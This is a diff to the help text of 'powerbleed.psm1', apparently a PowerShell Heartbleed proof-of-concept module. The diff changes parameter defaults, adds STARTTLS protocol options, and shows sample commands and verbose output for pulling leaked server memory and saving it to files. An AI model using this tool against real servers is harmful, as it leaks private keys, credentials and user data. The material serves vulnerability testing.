@@ -21,23 +21,23 @@ here.
 
 .PARAMETER WriteFile
 
-If this parameter is added, a file named "$Computername-hb.dat" will be written
+If this parameter is added, a file named "$Computername-port$Port-hb.dat" will be written
 containing all of the binary data retrieved for a specific computer host.
 
 .PARAMETER TLSTries
 
 Perform a full TLS connection to the server this many times. The default
-for this parameter is 3. More data may be leaked with continued connect
+for this parameter is 1. More data may be leaked with continued connect
 attempts.
 
 .PARAMETER Heartbeats
 
 For a single TLS connection, send this many heartbeat requests
-and gather the resulting data.  This defaults to 3 also.
+and gather the resulting data.  This defaults to 1 also.
 
 .PARAMETER HBLen
 
-The length of the malformed heartbeat packet.
+The length of the malformed heartbeat packet.  Defaults to 65535 bytes.
 
 .PARAMETER NoRandomDelay
 
@@ -50,10 +50,10 @@ The TCP timeout for a connect request.  Also this is the
 read bytes timeout during the response reading.  This will
 timeout if the server does not support the TLS heartbeat function.
 
-.PARAMETER STARTTLS
+.PARAMETER STLSProto
 
-A boolean parameter that if true will send the plaintext "STARTTLS"
-command before sending the TLS client hello.
+Use STARTTLS and define which protocol to support.
+Choices are: IMAP, POP, SMTP, FTP.  Defaults to NONE.
 
 .LINK
 
@@ -62,7 +62,7 @@ http://packetstormsecurity.com/files/126070/Heartbleed-Proof-Of-Concept.html
 .NOTES
 
 Author: Joff Thyer, April 2014
-Version: 20140425-2205
+Version: 20140501-1011
 Acknowledgments to Tim Tomes.
 
 .EXAMPLE
@@ -72,6 +72,57 @@ current working directory.
 
 C:\>powershell -command (Import-Module ./powerbleed.psm1); Test-Heartbleed -Computername 10.10.1.150 -Verbose
 
+
+Powershell interactive usage examples:
+
+PS C:\> Import-Module ./powerbleed.psm1
+
+PS C:\> Test-Heartbleed -Computername 10.10.1.150 -Heartbeats 5 -HBLen 32767 -Verbose
+VERBOSE: Testing 10.10.1.150
+VERBOSE: Sending Heartbeat support test packet
+VERBOSE: Connection attempt number: 1
+VERBOSE: Sending 5 TLS heartbeat packets
+VERBOSE: :  2896 bytes returned from server. (2896 total bytes)
+VERBOSE: : 29882 bytes returned from server. (32778 total bytes)
+VERBOSE: :  8688 bytes returned from server. (41466 total bytes)
+VERBOSE: : 24113 bytes returned from server. (65579 total bytes)
+... some output omitted ...
+
+Can also use the powershell pipeline to write bytes out to a file like this:
+
+PS C:\> Test-Heartbleed -Computername 10.10.1.150 | `
+              Select-Object -ExpandProperty Bytes | `
+              Set-Content -Encoding Byte -Path ./file.txt
+
+PS C:\> Test-Heartbleed -Computername 10.10.1.150 | Select-Object -ExpandProperty Bytes | Set-Content -Encoding Byte -Path ./file.txt
+
+
+Or as a one line command with no pipeline with the -WriteFile argument.
+
+PS C:\blah> Test-Heartbleed -Computername 10.10.1.150 -WriteFile
+PS C:\blah> ls
+
+    Directory: C:\blah
+
+Mode                LastWriteTime     Length Name
+----                -------------     ------ ----
+-a---          5/1/2014  10:08 AM       5793 10.10.1.150-port443-hb.dat
+-a---          5/1/2014  10:08 AM      16179 powerbleed.psm1
+
+
+
+Other examples:
+
+PS C:\> Test-Heartbleed -Computername 10.10.1.150 -Heartbeats 3 -TLSTries 3 -NoRandomDelay -Verbose
+
+PS C:\> Test-Heartbleed -Computername smtp.domain.tld -Port 25 -STLSProto SMTP -Verbose
+VERBOSE: Testing smtp.domain.tld
+VERBOSE: Sending Heartbeat support test packet
+VERBOSE: smtp.domain.tld does not support TLS heartbeat.
+
+Host                    Bytes                        Vulnerable String
+----                    -----                        ---------- ------
+smtp.domain.tld         {0}                          False
 
 
 #>
